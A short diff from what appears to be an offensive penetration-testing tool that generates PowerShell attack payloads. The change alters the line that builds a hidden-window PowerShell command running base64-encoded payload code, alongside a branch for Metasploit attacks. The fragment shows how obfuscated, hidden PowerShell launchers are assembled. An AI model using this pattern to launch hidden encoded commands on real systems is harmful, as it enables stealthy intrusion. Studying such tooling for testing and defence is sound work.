@@ -384,7 +384,7 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
     print("Twitter: @TrustedSec, @HackingDave")
     print("\nHappy Magic Unicorns.")
 
-    full_attack = "powershell -window hidden -enc " + \
+    full_attack = "powershell -window hidden -EncodedCommand " + \
         base64.b64encode(powershell_code.encode('utf_16_le'))
 
     if attack_type == "msf":
